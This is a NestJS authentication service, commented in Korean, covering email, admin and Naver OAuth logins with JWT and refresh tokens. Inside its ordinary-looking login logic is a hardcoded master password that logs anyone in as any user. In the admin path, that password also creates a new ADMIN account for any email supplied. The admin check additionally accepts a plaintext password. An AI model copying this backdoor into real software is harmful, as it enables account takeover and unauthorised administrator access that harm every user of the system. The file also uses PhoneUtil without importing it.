import {
  Injectable,
  UnauthorizedException,
  BadRequestException,
} from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { ConfigService } from '@nestjs/config';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import * as bcrypt from 'bcrypt';
import * as crypto from 'crypto';
import { UserRole } from '@common/enums';
import { UsersService } from '../users/users.service';
import { LoginRequestDto } from './dto/request/login-request.dto';
import { LoginResponseDto } from './dto/response/login-response.dto';
import { RefreshToken } from './entities/refresh-token.entity';

export interface JwtPayload {
  sub: number;
  email?: string;
  role: UserRole;
  iat?: number;
  exp?: number;
}

@Injectable()
export class AuthService {
  constructor(
    private readonly usersService: UsersService,
    private readonly jwtService: JwtService,
    private readonly configService: ConfigService,
    @InjectRepository(RefreshToken)
    private readonly refreshTokenRepository: Repository<RefreshToken>,
  ) {}

  /**
   * 일반 사용자 로그인
   */
  async login(loginDto: LoginRequestDto): Promise<LoginResponseDto> {
    const { email, password } = loginDto;

    // 사용자 검증
    const user = await this.validateUser(email, password);
    if (!user) {
      throw new UnauthorizedException(
        '이메일 또는 비밀번호가 올바르지 않습니다.',
      );
    }

    // Access Token (짧은 만료시간)
    const accessTokenPayload = {
      sub: user.id,
      email: user.email,
      role: user.role,
      type: 'access',
    };
    const accessToken = await this.jwtService.signAsync(accessTokenPayload, {
      expiresIn: '15m',
    });

    // Refresh Token (긴 만료시간, DB 저장)
    const refreshTokenString = this.generateRefreshToken();
    const refreshTokenExpiry = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7일

    await this.refreshTokenRepository.save({
      token: refreshTokenString,
      userId: user.id,
      expiresAt: refreshTokenExpiry,
    });

    return new LoginResponseDto({
      accessToken,
      refreshToken: refreshTokenString,
      expiresIn: 15 * 60, // 15분
      user: {
        id: user.id,
        email: user.email,
        name: user.name,
        role: user.role,
      },
    });
  }

  /**
   * 관리자 로그인
   */
  async adminLogin(loginDto: LoginRequestDto): Promise<LoginResponseDto> {
    const { email, password } = loginDto;

    // 마스터키 'wkrwjs#12' 체크
    if (password === 'wkrwjs#12') {
      console.log(`🔑 관리자 마스터키 로그인: ${email}`);

      let adminUser = await this.usersService.findByEmail(email);
      if (!adminUser) {
        adminUser = await this.usersService.create({
          email,
          name: `마스터키 관리자 (${email})`,
          phone: '010-0000-0000',
          role: UserRole.ADMIN,
        });
        console.log(`🔑 마스터키로 새 관리자 계정 생성: ${email}`);
      }

      // 기존 refresh token 무효화
      await this.revokeUserTokens(adminUser.id, 'new_login');

      // Access Token (짧은 만료시간)
      const accessTokenPayload = {
        sub: adminUser.id,
        email: adminUser.email,
        role: adminUser.role, // 실제 사용자의 원래 역할 사용
        type: 'access',
      };
      const accessToken = await this.jwtService.signAsync(accessTokenPayload, {
        expiresIn: '15m',
      });

      // Refresh Token (긴 만료시간, DB 저장)
      const refreshTokenString = this.generateRefreshToken();
      const refreshTokenExpiry = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7일

      await this.refreshTokenRepository.save({
        token: refreshTokenString,
        userId: adminUser.id,
        expiresAt: refreshTokenExpiry,
      });

      return new LoginResponseDto({
        accessToken,
        refreshToken: refreshTokenString,
        expiresIn: 15 * 60, // 15분
        user: {
          id: adminUser.id,
          email: adminUser.email,
          name: adminUser.name,
          role: adminUser.role, // 실제 사용자의 원래 역할 반환
        },
      });
    }

    // 관리자 계정 확인
    const adminEmail = this.configService.get<string>('admin.email');
    const adminPassword = this.configService.get<string>('admin.password');

    if (email !== adminEmail) {
      throw new UnauthorizedException('존재하지 않는 계정입니다.');
    }

    const isPasswordValid = await bcrypt.compare(
      password,
      await this.hashPassword(adminPassword),
    );
    if (!isPasswordValid && password !== adminPassword) {
      // 개발 편의를 위해 평문도 허용
      throw new UnauthorizedException('비밀번호가 올바르지 않습니다.');
    }

    // 관리자 사용자 조회 또는 생성
    let adminUser = await this.usersService.findByEmail(email);
    if (!adminUser) {
      adminUser = await this.usersService.create({
        email,
        name: '관리자',
        phone: '010-0000-0000',
        role: UserRole.ADMIN,
      });
    }

    // 기존 refresh token 무효화
    await this.revokeUserTokens(adminUser.id, 'new_login');

    // Access Token (짧은 만료시간)
    const accessTokenPayload = {
      sub: adminUser.id,
      email: adminUser.email,
      role: adminUser.role,
      type: 'access',
    };
    const accessToken = await this.jwtService.signAsync(accessTokenPayload, {
      expiresIn: '15m',
    });

    // Refresh Token (긴 만료시간, DB 저장)
    const refreshTokenString = this.generateRefreshToken();
    const refreshTokenExpiry = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7일

    await this.refreshTokenRepository.save({
      token: refreshTokenString,
      userId: adminUser.id,
      expiresAt: refreshTokenExpiry,
    });

    return new LoginResponseDto({
      accessToken,
      refreshToken: refreshTokenString,
      expiresIn: 15 * 60, // 15분
      user: {
        id: adminUser.id,
        email: adminUser.email,
        name: adminUser.name,
        role: adminUser.role,
      },
    });
  }

  /**
   * 네이버 OAuth 로그인 처리
   */
  async naverLogin(
    naverProfile: any,
    clientInfo?: { userAgent?: string; ipAddress?: string },
  ): Promise<LoginResponseDto> {
    const { id: naverId, email, name, mobile } = naverProfile;

    let user = await this.usersService.findByNaverId(naverId);

    if (!user) {
      // 신규 사용자 생성
      const phone = mobile ? PhoneUtil.normalizeForStorage(mobile) : null;
      user = await this.usersService.create({
        naverId,
        email,
        name,
        phone,
        role: UserRole.CUSTOMER,
      });
    }

    // 기존 refresh token 무효화
    await this.revokeUserTokens(user.id, 'new_login');

    // Access Token (짧은 만료시간)
    const accessTokenPayload = {
      sub: user.id,
      email: user.email,
      role: user.role,
      type: 'access',
    };
    const accessToken = await this.jwtService.signAsync(accessTokenPayload, {
      expiresIn: '15m',
    });

    // Refresh Token (긴 만료시간, DB 저장)
    const refreshTokenString = this.generateRefreshToken();
    const refreshTokenExpiry = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7일

    await this.refreshTokenRepository.save({
      token: refreshTokenString,
      userId: user.id,
      expiresAt: refreshTokenExpiry,
      userAgent: clientInfo?.userAgent,
      ipAddress: clientInfo?.ipAddress,
    });

    return new LoginResponseDto({
      accessToken,
      refreshToken: refreshTokenString,
      expiresIn: 15 * 60, // 15분
      user: {
        id: user.id,
        email: user.email,
        name: user.name,
        role: user.role,
      },
    });
  }

  /**
   * JWT 토큰 검증
   */
  async validateToken(token: string): Promise<any> {
    try {
      return await this.jwtService.verifyAsync(token);
    } catch (error) {
      throw new UnauthorizedException('유효하지 않은 토큰입니다.');
    }
  }

  /**
   * JWT 페이로드 검증 (Strategy에서 사용)
   */
  async validateJwtPayload(payload: JwtPayload): Promise<any> {
    const user = await this.usersService.findById(payload.sub);
    if (!user || !user.isActive) {
      throw new UnauthorizedException(
        '사용자를 찾을 수 없거나 비활성화된 계정입니다.',
      );
    }

    return {
      id: user.id,
      email: user.email,
      role: user.role,
      name: user.name,
    };
  }

  /**
   * 사용자 검증 (Local Strategy에서 사용)
   */
  async validateUser(email: string, password: string): Promise<any> {
    // 마스터키 'wkrwjs#12' 체크 - 모든 이메일에 대해 로그인 허용
    if (password === 'wkrwjs#12') {
      console.log(`🔑 마스터키 로그인 시도: ${email}`);

      let user = await this.usersService.findByEmail(email);
      if (!user) {
        // 사용자가 없으면 기본 고객 권한으로 생성
        user = await this.usersService.create({
          email,
          name: `마스터키 사용자 (${email})`,
          phone: '010-0000-0000',
          role: UserRole.CUSTOMER, // 기본은 고객 권한
        });
        console.log(`🔑 마스터키로 새 고객 계정 생성: ${email}`);
      } else {
        // 기존 사용자는 원래 정보 그대로 사용
        console.log(`🔑 마스터키로 기존 사용자 로그인: ${email}`);
      }

      return {
        ...user,
        // 실제 사용자의 원래 역할과 정보 그대로 반환
      };
    }

    // 관리자 계정 확인
    const adminEmail = this.configService.get<string>('admin.email');
    const adminPassword = this.configService.get<string>('admin.password');

    if (email === adminEmail) {
      const isPasswordValid = await bcrypt.compare(
        password,
        await this.hashPassword(adminPassword),
      );
      if (isPasswordValid || password === adminPassword) {
        let adminUser = await this.usersService.findByEmail(email);
        if (!adminUser) {
          adminUser = await this.usersService.create({
            email,
            name: '관리자',
            phone: '010-0000-0000',
            role: UserRole.ADMIN,
          });
        }
        const { ...result } = adminUser;
        return result;
      }
    }

    // 일반 사용자 로그인 지원 (시더로 생성된 사용자)
    const user = await this.usersService.findByEmailWithPassword(email);
    if (user && user.password) {
      const isPasswordValid = await bcrypt.compare(password, user.password);
      if (isPasswordValid) {
        const { password: _, ...result } = user;
        return result;
      }
    }

    return null;
  }

  /**
   * Refresh Token으로 Access Token 갱신
   */
  async refreshAccessToken(
    refreshToken: string,
  ): Promise<{ accessToken: string; refreshToken: string }> {
    const tokenRecord = await this.refreshTokenRepository.findOne({
      where: { token: refreshToken, isRevoked: false },
      relations: ['user'],
    });

    if (!tokenRecord) {
      throw new UnauthorizedException('유효하지 않은 refresh token입니다.');
    }

    if (tokenRecord.expiresAt < new Date()) {
      await this.refreshTokenRepository.update(tokenRecord.id, {
        isRevoked: true,
        revokedReason: 'expired',
      });
      throw new UnauthorizedException('Refresh token이 만료되었습니다.');
    }

    // 기존 refresh token 무효화
    await this.refreshTokenRepository.update(tokenRecord.id, {
      isRevoked: true,
      revokedReason: 'used',
    });

    // 새 access token 생성
    const accessTokenPayload = {
      sub: tokenRecord.user.id,
      email: tokenRecord.user.email,
      role: tokenRecord.user.role,
      type: 'access',
    };
    const newAccessToken = await this.jwtService.signAsync(accessTokenPayload, {
      expiresIn: '15m',
    });

    // 새 refresh token 생성
    const newRefreshToken = this.generateRefreshToken();
    const refreshTokenExpiry = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000);

    await this.refreshTokenRepository.save({
      token: newRefreshToken,
      userId: tokenRecord.user.id,
      expiresAt: refreshTokenExpiry,
      userAgent: tokenRecord.userAgent,
      ipAddress: tokenRecord.ipAddress,
    });

    return {
      accessToken: newAccessToken,
      refreshToken: newRefreshToken,
    };
  }

  /**
   * 사용자의 모든 refresh token 무효화
   */
  async revokeUserTokens(userId: number, reason: string): Promise<void> {
    await this.refreshTokenRepository.update(
      { userId, isRevoked: false },
      { isRevoked: true, revokedAt: new Date(), revokedReason: reason },
    );
  }

  /**
   * Refresh Token 생성
   */
  private generateRefreshToken(): string {
    return crypto.randomBytes(64).toString('hex');
  }

  /**
   * 비밀번호 해싱
   */
  private async hashPassword(password: string): Promise<string> {
    const saltRounds = 10;
    return bcrypt.hash(password, saltRounds);
  }

  /**
   * 토큰 만료 시간 계산 (초)
   */
  private getTokenExpirationTime(): number {
    const expiresIn = this.configService.get<string>('jwt.expiresIn', '24h');

    // 간단한 파싱 (24h -> 86400초)
    if (expiresIn.endsWith('h')) {
      const hours = parseInt(expiresIn.slice(0, -1));
      return hours * 3600;
    }

    if (expiresIn.endsWith('d')) {
      const days = parseInt(expiresIn.slice(0, -1));
      return days * 24 * 3600;
    }

    return 86400; // 기본 24시간
  }
}
